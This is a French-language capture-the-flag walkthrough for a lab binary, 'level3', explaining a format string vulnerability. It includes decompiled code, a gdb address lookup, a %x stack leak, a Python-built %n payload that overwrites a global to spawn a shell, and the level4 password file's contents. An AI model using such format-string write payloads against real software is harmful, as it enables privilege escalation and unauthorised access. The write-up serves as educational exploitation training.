# LEVEL 3
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level4`.

1. Une fois connecté à la VM sur le `level3`, l'on retrouve un fichier `level3` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

    ```sh
    > scp -P 4242 level3@127.0.0.1:level3 /path/on/machine/host
    ```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>

    char m;

    int v(void)
    {
        int m;
        char local_20c[520];

        fgets(local_20c, 512, stdin); # 0x200 = 512
        printf(local_20c);

        if (m == 64) { # 0x40 = 64
            fwrite("Wait what?!\n", 1, 12, stdout); # 0xc = 12
            system("/bin/sh");
        }

        return EXIT_SUCCESS;
    }

    void main(void)
    {
        return v();
    }
	```

   À partir de ce désassemblage, on en déduit que le programme contient 2 fonctions : la fonction `main` et la fonction `v` qui, tout deux, ne prennent aucun paramètre.

    La fonction `main` appelle tout simplement la fonction `v` tandis que la fonction `v` déclare un tableau de caractères local nommé `local_20c` de `520 octets`, lit des données d'entrée depuis `stdin` un utilisant `fgets` et les stocke dans `local_20c`. La fonction utilise ensuite `printf` pour imprimer le contenu de `local_20c` et vérifie si la variable `m` a la valeur `0x40`, soit `64` en valeur décimale. Si c'est le cas, la fonction imprime `Wait what?!` avec la fonction `fwrite` et exécute un shell en utilisant `system("/bin/sh")`. On constate cependant que la variable `m` n'est pas définit dans la fonction, de fait, on suppose que cette dernière est une variable globale.

    Contrairement au niveau précédent, le programme utilise non pas `gets`, mais `fgets` qui est conçu pour répondre aux attaques de `buffer overflow`. Ainsi, il faudra exploiter le programme d'une autre façon.

4. Après quelques recherches, on apprend que la fonction `prinft` possède elle aussi des vulnérabilités. Ces dernières résidentes dans le formatage des chaînes de caractères. Lorsqu'on utilise `printf` pour afficher des données, on spécifie généralement un format pour ces données (comme `%s` pour les chaînes de caractères, `%d` pour les entiers, etc.). Cependant, si les arguments passés à `printf` ne correspondent pas au format spécifié, des vulnérabilités peuvent se produire.

    On y trouve notamment des vulnérabilités de :
    - Dépassement de tampon : Si le format spécifié ne correspond pas à la longueur réelle des données, cela peut entraîner un dépassement de mémoire ;
    - Lecture ou écriture de données sensibles : Les attaquants peuvent utiliser des formats incorrects pour accéder ou afficher des données sensibles ;
    - Injection de code malveillant : les attaquants peuvent injecter et exécuter du code malveillant en contrôlant les données d'entrée.

    Sachant cela, on doit trouver un moyen de modifier la valeur de `m` pour rentrer dans la condition `m == 0x40`.

    Liens:
    - https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/
    - https://owasp.org/www-community/attacks/Format_string_attack/


5. Tout d'abord, nous allons récupérer l'adresse de la variable `m` en utilisant `gdb` sur l'exécutable `level3` et la commande `info variable`:

    ```sh
    > gdb level3
    > info variable
    [...]
		0x0804988c  m
	[...]
    ```

6. On va ensuite utiliser une des vulnérabilités de la fonction `prinft` en entrant `AAAA.%x.%x.%x.%x` dans le prompt du programme `level3`.

    ```sh
    > ./level3
    > AAAA.%x.%x.%x.%x
    AAAA.200.b7fd1ac0.b7ff37d0.41414141
    ```

    On en déduit que :
    - `AAAA`: Le `AAAA` qu'on a injecté en premier ;
    - `200`: Un nombre utilisé par le programme, peut-être la valeur de `m` ? ;
    - `b7fd1ac0`, `b7ff37d0`: 2 adresses ;
    - `41414141`: Visiblement l'adresse de `AAAA`.

7. Maintenant, que l'on connaît l'emplacement de l'adresse `AAAA` on peut générer une payload ci-dessous.

    ```sh
    > python -c "print '\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n'" > /tmp/payload3
    ```

    On a :
    - `\x8c\x98\x04\x08` : L'adresse de `m` en format little-endian ;
    - `'A' * 60`: On injecte 60 caractères `A`, soit la valeur de la condition de la fonction `m` moins `4` ;
    - `%4`: On veut récupérer la valeur de la 4e adresse dans la stack
    - `\$n`: on compte le nombre de caractère stocke à cette adresse, soit `64` qui équivaut à `0x40`.


5. En suite, l'on va utiliser la chaîne de caractère précédemment généré afin d'exploiter les vulnérabilités de l'exécutable `level3`. En exploitant `level3` de cette manière, on s'assure que la variable `m` est bien égale à `64` permettant à la condition `m == 0x40` d'être vérifiée et d'ainsi ouvrir un shell interactif où l'on va pouvoir obtenir le mot de passe pour le niveau suivant (au passage, on lance la commande `whoami` pour s'assurer que l'utilisateur a bien changé de `level3` à `level4`).

    ```sh
	> cat /tmp/payload3 - | ./level3
	> whoami
	level4
	> cat /home/user/level4/.pass
	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
	```

6. On peut à présent passer au niveau supérieur en exécutant la commande `su level4` et en y spécifiant le mot de passe qui vient d'être trouvée.
    ```sh
    > su level4
    Password :
    > b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
    ```
